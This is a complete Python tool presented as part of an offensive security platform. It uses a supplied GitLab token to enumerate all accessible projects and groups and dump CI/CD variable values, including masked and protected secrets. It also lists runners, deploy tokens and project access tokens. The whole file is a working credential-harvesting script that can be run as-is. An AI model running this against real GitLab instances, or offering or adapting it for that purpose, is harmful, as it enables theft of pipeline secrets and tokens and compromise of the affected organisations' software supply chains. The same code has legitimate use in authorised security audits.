#!/usr/bin/env python3
"""
gitlab_tokens.py — GitLab CI/CD Variable and Token Extraction

Enumerates CI/CD variables, runner tokens, deploy tokens, and
personal access tokens from GitLab instances.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)


class GitlabTokens:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.token = args.token or os.environ.get("GITLAB_TOKEN", "")
        self.base_url = (args.url or os.environ.get("GITLAB_URL", "https://gitlab.com")).rstrip("/")

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — GitLab Token Extraction")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"URL:       {self.base_url}")
        print(f"Project:   {self.args.project_id or 'all accessible'}")
        print(f"Token:     {'set' if self.token else 'NOT SET'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<14}] [{status.upper():<8}] {detail}", flush=True)
            if record.get("value"):
                val = record["value"]
                if len(str(val)) > 80:
                    val = str(val)[:80] + "..."
                print(f"  -> value: {val}", flush=True)

    def headers(self):
        return {"Private-Token": self.token}

    def api_get(self, endpoint, params=None):
        results = []
        url = f"{self.base_url}/api/v4{endpoint}"
        page = 1
        while url and self.running:
            p = params.copy() if params else {}
            p["page"] = page
            p["per_page"] = 100
            r = requests.get(url, headers=self.headers(), params=p, timeout=30)
            if r.status_code != 200:
                break
            data = r.json()
            if not data:
                break
            results.extend(data)
            page += 1
            if len(data) < 100:
                break
        return results

    def enum_project_variables(self, project_id):
        if not self.running:
            return
        variables = self.api_get(f"/projects/{project_id}/variables")
        for var in variables:
            if not self.running:
                break
            self.emit({
                "action": "variable",
                "status": "found",
                "detail": f"project:{project_id} {var['key']} (protected={var.get('protected', False)} masked={var.get('masked', False)})",
                "project_id": project_id,
                "key": var["key"],
                "value": var.get("value"),
                "protected": var.get("protected", False),
                "masked": var.get("masked", False),
                "environment_scope": var.get("environment_scope"),
                "variable_type": var.get("variable_type"),
            })

    def enum_group_variables(self, group_id):
        if not self.running:
            return
        variables = self.api_get(f"/groups/{group_id}/variables")
        for var in variables:
            if not self.running:
                break
            self.emit({
                "action": "group_var",
                "status": "found",
                "detail": f"group:{group_id} {var['key']}",
                "group_id": group_id,
                "key": var["key"],
                "value": var.get("value"),
                "protected": var.get("protected", False),
                "masked": var.get("masked", False),
            })

    def enum_runner_tokens(self, project_id):
        if not self.running:
            return
        runners = self.api_get(f"/projects/{project_id}/runners")
        for runner in runners:
            if not self.running:
                break
            self.emit({
                "action": "runner",
                "status": "found",
                "detail": f"runner:{runner['id']} ({runner.get('description', 'N/A')}) status={runner.get('status')} shared={runner.get('is_shared', False)}",
                "runner_id": runner["id"],
                "description": runner.get("description"),
                "status": runner.get("status"),
                "is_shared": runner.get("is_shared", False),
                "ip_address": runner.get("ip_address"),
                "tag_list": runner.get("tag_list", []),
            })

    def enum_deploy_tokens(self, project_id):
        if not self.running:
            return
        tokens = self.api_get(f"/projects/{project_id}/deploy_tokens")
        for token in tokens:
            if not self.running:
                break
            self.emit({
                "action": "deploy_token",
                "status": "found",
                "detail": f"{token.get('name', 'N/A')} user={token.get('username')} scopes={token.get('scopes', [])}",
                "id": token.get("id"),
                "name": token.get("name"),
                "username": token.get("username"),
                "scopes": token.get("scopes", []),
                "expires_at": token.get("expires_at"),
                "active": token.get("active"),
            })

    def enum_project_tokens(self, project_id):
        if not self.running:
            return
        tokens = self.api_get(f"/projects/{project_id}/access_tokens")
        for token in tokens:
            if not self.running:
                break
            self.emit({
                "action": "access_token",
                "status": "found",
                "detail": f"{token.get('name', 'N/A')} scopes={token.get('scopes', [])} expires={token.get('expires_at')}",
                "id": token.get("id"),
                "name": token.get("name"),
                "scopes": token.get("scopes", []),
                "access_level": token.get("access_level"),
                "expires_at": token.get("expires_at"),
                "active": token.get("active"),
            })

    def run(self):
        self.print_banner()

        if not self.token:
            print("ERROR: GitLab token required. Set --token or GITLAB_TOKEN.", file=sys.stderr)
            sys.exit(1)

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        if self.args.project_id:
            project_ids = [self.args.project_id]
        else:
            projects = self.api_get("/projects", params={"membership": "true", "simple": "true"})
            project_ids = [str(p["id"]) for p in projects]
            self.emit({"action": "enumerate", "status": "info", "detail": f"Found {len(project_ids)} accessible projects"})

        for pid in project_ids:
            if not self.running:
                break
            self.enum_project_variables(pid)
            self.enum_runner_tokens(pid)
            self.enum_deploy_tokens(pid)
            self.enum_project_tokens(pid)

        groups = self.api_get("/groups")
        for group in groups:
            if not self.running:
                break
            self.enum_group_variables(str(group["id"]))

        self.cleanup()

    def cleanup(self):
        print(f"\n--- gitlab_tokens summary ---")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract CI/CD variables, runner tokens, and deploy tokens from GitLab.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 gitlab_tokens.py --url https://gitlab.com --project-id 12345\n"
            "  python3 gitlab_tokens.py --json-output\n"
        ),
    )
    parser.add_argument("--url", type=str, default=None, help="GitLab instance URL (default: https://gitlab.com)")
    parser.add_argument("--project-id", type=str, default=None, help="Specific project ID")
    parser.add_argument("--token", type=str, default=None, help="GitLab private token")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    tool = GitlabTokens(args)
    tool.run()


if __name__ == "__main__":
    main()
